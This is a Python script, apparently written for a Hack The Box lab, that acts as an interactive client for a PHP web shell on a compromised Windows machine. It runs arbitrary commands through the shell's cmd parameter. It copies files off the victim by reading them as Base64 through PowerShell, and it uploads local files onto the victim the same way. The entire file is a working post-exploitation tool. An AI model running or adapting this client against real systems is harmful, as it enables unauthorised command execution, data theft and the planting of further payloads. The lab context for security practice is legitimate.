import requests
import urllib.parse
import sys
import os

# !! CONFIGURACIÓN: Reemplaza con la IP completa y correcta de la máquina HTB !!
URL_SHELL = "http://192.168.1.200:8000/carpeta/shell.php" 

# Límite de seguridad para evitar consumo excesivo de memoria (10 MB)
MAX_BYTES = 10 * 1024 * 1024 

def ejecutar_comando(comando):
    """Envía el comando codificado, procesa la respuesta en streaming y maneja bytes de forma segura."""
    try:
        comando_codificado = urllib.parse.quote(comando)
        # Activamos stream=True para leer los datos en bloques controlados
        respuesta = requests.get(f"{URL_SHELL}?cmd={comando_codificado}", timeout=30, stream=True)
        
        if respuesta.status_code == 200:
            contenido_bytes = bytearray()
            for bloque in respuesta.iter_content(chunk_size=4096):
                contenido_bytes.extend(bloque)
                if len(contenido_bytes) > MAX_BYTES:
                    print(f"\n[!] Advertencia: Salida truncada porque excedió el límite de {MAX_BYTES / (1024*1024)} MB.")
                    break
            
            # Decodificamos usando 'replace' para que los caracteres extraños no rompan el script
            # cp1252 o cp850 son comunes en Windows, utf-8 es el estándar general
            return contenido_bytes.decode('utf-8', errors='replace').strip()
        else:
            print(f"\n[!] Error HTTP: {respuesta.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Error de conexión: {e}")
        return None

def bajar_archivo(ruta_remota, ruta_local):
    """Descarga un archivo desde la máquina víctima leyendo su contenido en Base64."""
    print(f"[*] Descargando '{ruta_remota}' -> '{ruta_local}'...")
    # Comando de PowerShell para leer el archivo y codificarlo en Base64 para una transferencia segura
    comando = f'powershell -Command "[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\'{ruta_remota}\'))"'
    
    salida_b64 = ejecutar_comando(comando)
    if salida_b64 and "Error" not in salida_b64 and "no se puede encontrar" not in salida_b64:
        try:
            import base64
            # Limpiamos posibles saltos de línea de la salida
            datos_binarios = base64.b64decode(salida_b64.replace("\r", "").replace("\n", ""))
            with open(ruta_local, "wb") as f:
                f.write(datos_binarios)
            print("[+] Descarga completada con éxito.")
        except Exception as e:
            print(f"[!] Error al procesar los datos de descarga: {e}")
    else:
        print("[!] Error: No se pudo descargar el archivo. Verifica la ruta remota.")

def subir_archivo(ruta_local, ruta_remota):
    """Sube un archivo local a la máquina víctima codificándolo en Base64."""
    if not os.path.exists(ruta_local):
        print(f"[!] Error: El archivo local '{ruta_local}' no existe.")
        return

    print(f"[*] Subiendo '{ruta_local}' -> '{ruta_remota}'...")
    try:
        import base64
        with open(ruta_local, "rb") as f:
            contenido_b64 = base64.b64encode(f.read()).decode('utf-8')
        
        # Comando de PowerShell para decodificar el Base64 recibido y guardarlo en el disco de la víctima
        comando = f'powershell -Command "[System.IO.File]::WriteAllBytes(\'{ruta_remota}\', [Convert]::FromBase64String(\'{contenido_b64}\'))"'
        ejecutar_comando(comando)
        print("[+] Archivo subido con éxito.")
    except Exception as e:
        print(f"[!] Error al subir el archivo: {e}")

def main():
    print("\n" + "="*60)
    print("      WEBSHELL INTERACTIVA AVANZADA - By kr1pt0n v1.0")
    print("="*60)
    print("[*] Inicializando entorno y obteniendo contexto...")

    usuario = ejecutar_comando("whoami")
    if not usuario:
        usuario = "user"
    
    ruta_actual = ejecutar_comando("cd")
    if not ruta_actual or "Error" in ruta_actual:
        ruta_actual = "C:\\"

    print(f"[+] Conectado con éxito como: {usuario}")
    print("[*] Comandos especiales locales:")
    print("    -> upload <archivo_local> <nombre_remoto>")
    print("    -> download <archivo_remoto> <nombre_local>")
    print("    -> exit / clear\n")

    while True:
        try:
            prompt = f"({usuario}) {ruta_actual}> "
            comando = input(prompt).strip()

            if comando.lower() == 'exit':
                print("[*] Cerrando sesión...")
                break
            if not comando:
                continue
            if comando.lower() == 'clear' or comando.lower() == 'cls':
                print("\033[H\033[2J", end="")
                continue

            # --- COMANDO ESPECIAL: UPLOAD ---
            if comando.startswith("upload "):
                partes = comando.split(" ")
                if len(partes) >= 3:
                    subir_archivo(partes[1], partes[2])
                else:
                    print("[!] Uso: upload <archivo_local> <ruta_remota>")
                continue

            # --- COMANDO ESPECIAL: DOWNLOAD ---
            if comando.startswith("download "):
                partes = comando.split(" ")
                if len(partes) >= 3:
                    bajar_archivo(partes[1], partes[2])
                else:
                    print("[!] Uso: download <ruta_remota> <archivo_local>")
                continue

            # Navegación estándar de directorios (cd)
            if comando.startswith("cd "):
                partes = comando.split(" ", 1)
                nueva_ruta = partes[1].strip()
                
                comando_completo = f"cd /d \"{ruta_actual}\" && cd /d \"{nueva_ruta}\" && cd"
                resultado = ejecutar_comando(comando_completo)
                
                if resultado and "El sistema no puede encontrar la ruta" not in resultado:
                    ruta_actual = resultado
                else:
                    print(f"\n[!] Error: No se puede encontrar la ruta especificada: '{nueva_ruta}'\n")
            
            # Ejecución de comandos generales
            else:
                comando_completo = f"cd /d \"{ruta_actual}\" && {comando}"
                salida = ejecutar_comando(comando_completo)
                if salida:
                    print(f"\n{salida}\n")

        except KeyboardInterrupt:
            print("\n\n[*] Saliendo de forma segura...")
            break

if __name__ == "__main__":
    main()
